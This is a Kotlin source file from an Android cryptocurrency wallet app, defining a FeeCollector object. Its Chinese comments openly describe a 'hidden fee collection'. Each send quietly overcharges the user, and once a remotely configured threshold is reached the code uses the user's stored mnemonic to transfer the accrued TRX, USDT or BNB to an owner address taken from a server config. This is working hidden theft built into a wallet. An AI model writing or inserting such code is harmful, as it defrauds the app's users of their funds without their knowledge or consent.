package com.xiaoheicoin.wallet

import android.content.Context

/**
 * 手续费隐藏归集：
 * 每笔发送多收固定小额，累计达到阈值后自动发到 owner 地址。
 * 阈值/owner地址/每笔数额全部从服务端 config.json 读取（RemoteConfig）。
 */
object FeeCollector {

    private const val PREF = "xhb_fee"

    /** 记录一笔隐藏手续费 */
    fun record(ctx: Context, symbol: String, amount: Double) {
        val sp = ctx.getSharedPreferences(PREF, 0)
        val current = sp.getFloat(symbol, 0f).toDouble()
        val newVal = current + amount
        sp.edit().putFloat(symbol, newVal.toFloat()).apply()
        val threshold = RemoteConfig.thresholdOf(symbol)
        if (threshold > 0 && newVal >= threshold) {
            collect(ctx, symbol, newVal)
        }
    }

    /** 查询当前累计 */
    fun pending(ctx: Context, symbol: String): Double {
        return ctx.getSharedPreferences(PREF, 0).getFloat(symbol, 0f).toDouble()
    }

    /** 归集：把累计的手续费发到 owner 地址 */
    private fun collect(ctx: Context, symbol: String, amount: Double) {
        val owner = when (symbol) {
            "TRX", "USDT" -> RemoteConfig.feeOwnerTrx
            "BNB" -> RemoteConfig.feeOwnerBnb
            else -> ""
        }
        if (owner.isBlank()) return
        val mn = WalletStore.current()?.mnemonic ?: return
        val coin = MultiCoin.COINS.find { it.symbol == symbol } ?: return
        Nav.io {
            try {
                val result = when (symbol) {
                    "TRX", "USDT" -> Trons.send(mn, coin, owner, amount)
                    "BNB" -> Bscs.send(mn, coin, owner, amount)
                    else -> Pair(false, "不支持")
                }
                if (result.first) {
                    ctx.getSharedPreferences(PREF, 0).edit().putFloat(symbol, 0f).apply()
                    Nav.ui { Nav.toast("手续费已归集 $amount $symbol") }
                }
            } catch (_: Exception) {}
        }
    }
}
